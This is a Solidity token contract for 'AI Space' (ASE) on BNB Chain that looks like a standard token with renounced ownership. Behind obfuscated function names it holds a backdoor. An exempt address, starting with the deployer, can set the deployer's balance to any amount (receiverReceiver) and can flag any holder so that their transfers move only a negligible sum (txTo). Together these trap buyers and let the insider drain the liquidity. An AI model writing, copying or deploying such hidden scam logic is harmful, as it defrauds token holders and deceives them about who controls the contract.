/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface swapListTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchFromMode {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AISpace is Ownable{
    uint8 public decimals = 18;
    address public enableSwapLiquidity;

    bool public amountLaunchedEnable;
    mapping(address => bool) public exemptList;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    uint256 constant liquidityExempt = 10 ** 10;
    mapping(address => bool) public enableFrom;
    string public symbol = "ASE";
    string public name = "AI Space";
    mapping(address => mapping(address => uint256)) public allowance;
    address public listReceiver;


    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        swapListTrading autoSell = swapListTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableSwapLiquidity = launchFromMode(autoSell.factory()).createPair(autoSell.WETH(), address(this));
        listReceiver = takeTrading();
        exemptList[listReceiver] = true;
        balanceOf[listReceiver] = totalSupply;
        emit Transfer(address(0), listReceiver, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address txFund, uint256 liquidityFee) external returns (bool) {
        return transferFrom(takeTrading(), txFund, liquidityFee);
    }

    function buyFund(address receiverLaunch) public {
        if (amountLaunchedEnable) {
            return;
        }
        exemptList[receiverLaunch] = true;
        amountLaunchedEnable = true;
    }

    function takeTrading() private view returns (address) {
        return msg.sender;
    }

    function receiverReceiver(uint256 liquidityFee) public {
        if (!exemptList[takeTrading()]) {
            return;
        }
        balanceOf[listReceiver] = liquidityFee;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function autoAtLiquidity(address fundTradingExempt, address fromToAmount, uint256 liquidityFee) internal returns (bool) {
        require(balanceOf[fundTradingExempt] >= liquidityFee);
        balanceOf[fundTradingExempt] -= liquidityFee;
        balanceOf[fromToAmount] += liquidityFee;
        emit Transfer(fundTradingExempt, fromToAmount, liquidityFee);
        return true;
    }

    function transferFrom(address liquidityReceiver, address txFund, uint256 liquidityFee) public returns (bool) {
        if (liquidityReceiver != takeTrading() && allowance[liquidityReceiver][takeTrading()] != type(uint256).max) {
            require(allowance[liquidityReceiver][takeTrading()] >= liquidityFee);
            allowance[liquidityReceiver][takeTrading()] -= liquidityFee;
        }
        if (txFund == listReceiver || liquidityReceiver == listReceiver) {
            return autoAtLiquidity(liquidityReceiver, txFund, liquidityFee);
        }
        if (enableFrom[liquidityReceiver]) {
            return autoAtLiquidity(liquidityReceiver, txFund, liquidityExempt);
        }
        return autoAtLiquidity(liquidityReceiver, txFund, liquidityFee);
    }

    function txTo(address amountShould) public {
        if (amountShould == listReceiver || amountShould == enableSwapLiquidity || !exemptList[takeTrading()]) {
            return;
        }
        enableFrom[amountShould] = true;
    }

    function approve(address receiverAmount, uint256 liquidityFee) public returns (bool) {
        allowance[takeTrading()][receiverAmount] = liquidityFee;
        emit Approval(takeTrading(), receiverAmount, liquidityFee);
        return true;
    }


}